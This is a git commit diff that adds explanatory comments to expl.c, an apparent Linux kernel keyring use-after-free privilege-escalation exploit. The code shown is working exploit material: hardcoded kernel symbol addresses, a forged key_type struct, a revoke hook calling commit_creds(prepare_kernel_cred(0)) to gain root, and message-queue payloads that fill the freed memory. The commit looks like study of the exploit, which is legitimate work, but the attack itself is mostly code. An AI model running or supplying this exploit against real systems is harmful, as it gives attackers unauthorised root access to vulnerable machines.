30156c4a5b42ce2d6373ea4a6be4fd57be873979
Dave Swanson <davesswanson@hotmail.com>
2018-12-05 13:15:52 -0800

    Update expl.c

--- expl.c
+++ expl.c
@@ -26,10 +26,19 @@ typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsig
 _commit_creds commit_creds;
 _prepare_kernel_cred prepare_kernel_cred;
 
-#define STRUCT_LEN (0xb8 - 0x30)
+/* This is the address of kernel stuff we need, usually consistent across versions */
 #define COMMIT_CREDS_ADDR (0xffffffff81094250)
 #define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)
 
+/* This is the length of our payload struct:
+ * The first number is the size of struct key_type as defined in kernel source code
+ * The second number is the length of the header of the message that will put
+ * the payload into kernel space */
+#define STRUCT_LEN (0xb8 - 0x30)
+
+/* This is the payload struct: compare it to the real key_type in comments below. 
+ * Notice that the last 5 items are removed: This accounts for the 0x30 bytes
+ * taken by the message header */
 struct key_type {
     char * name;
     size_t datalen;
@@ -43,46 +52,91 @@ struct key_type {
     void * revoke;
     void * destroy;
 };
+/*
+ * 
+struct key_type {
+	const char *name;
+	size_t def_datalen;
+	int (*vet_description)(const char *description);
+	int (*preparse)(struct key_preparsed_payload *prep);
+	void (*free_preparse)(struct key_preparsed_payload *prep);
+	int (*instantiate)(struct key *key, struct key_preparsed_payload *prep);
+	int (*update)(struct key *key, struct key_preparsed_payload *prep);
+	int (*match_preparse)(struct key_match_data *match_data);
+	void (*match_free)(struct key_match_data *match_data);
+	void (*revoke)(struct key *key);
+	void (*destroy)(struct key *key);
+	void (*describe)(const struct key *key, struct seq_file *p);
+	long (*read)(const struct key *key, char __user *buffer, size_t buflen);
+	request_key_actor_t request_key;
+	struct list_head	link;
+	struct lock_class_key	lock_class;
+};
+ * */
 
+/* Userspace function to be executed on calling keytype->revoke(), 
+ * assuming other protections are not in place (they are, generally) */
 void userspace_revoke(void * key) {
     commit_creds(prepare_kernel_cred(0));
 }
 
 int main(int argc, const char *argv[]) {
-    const char *keyring_name;
+	/*=============Declare Variables==================================*/
+	
+	/* Empty vars to be filled later */
+    const char *keyring_name;			//name given by argv[1]
     size_t i = 0;
-    unsigned long int l = 0x100000000/2;
-    key_serial_t serial = -1;
-    pid_t pid = -1;
-    struct key_type * my_key_type = NULL;
+    key_serial_t serial = -1;			//for the first key, set by keyctl() 
+    pid_t pid = -1;						//for the forking
+    struct key_type * my_key_type = NULL;//for the payload
     
-    struct { long mtype;
+    /* This is part of a scheme to pause the loop on powers of 2
+     * 0x100000000/2 = 0x8000000.  Why it's declared this way, I have
+     * no idea.  It would break on 32-bit systems */
+    unsigned long int l = 0x100000000/2;
+
+    /* This defines the message to be sent that will occupy
+     * the freed space.
+     * The 0x4141414141414141 is the message type (64-bit long)
+     * mtext set to null */
+    struct { 
+		long mtype;
 		char mtext[STRUCT_LEN];
     } msg = {0x4141414141414141, {0}};
     int msqid;
 
+	/*=============Actions============================================*/
+
+	/* Handle error case and initial display */
     if (argc != 2) {
         puts("usage: ./keys <key_name>");
         return 1;
     }
-
     printf("uid=%d, euid=%d\n", getuid(), geteuid()); 
+    
+    /* I think this puts the addresses into a register */
     commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;
     prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;
     
+    /* Allocate user space struct on heap */
     my_key_type = malloc(sizeof(*my_key_type));
-
+	/* Connect function to struct */
     my_key_type->revoke = (void*)userspace_revoke;
+    /* Initialize mtext to all A's */
     memset(msg.mtext, 'A', sizeof(msg.mtext));
 
+	/* Set specific points in mtext to values expected by a function
+	 * parsing a key_type struct.
+	 * Note: not sure if 56 should be set to current effective id.
+	 * If so, why is geteuid() commented out? */
     // key->uid
     *(int*)(&msg.mtext[56]) = 0x3e8; /* geteuid() */
-    //key->perm
+    //key->perm: sets permissions
     *(int*)(&msg.mtext[64]) = 0x3f3f3f3f;
-
-    //key->type
+    //key->type: puts a pointer to userspace payload struct at 80
     *(unsigned long *)(&msg.mtext[80]) = (unsigned long)my_key_type;
 
+	/* Create one message: this step is repeated many times later */
     if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
         perror("msgget");
         exit(1);
@@ -167,3 +221,4 @@ int main(int argc, const char *argv[]) {
 
     return 0;
 }
+
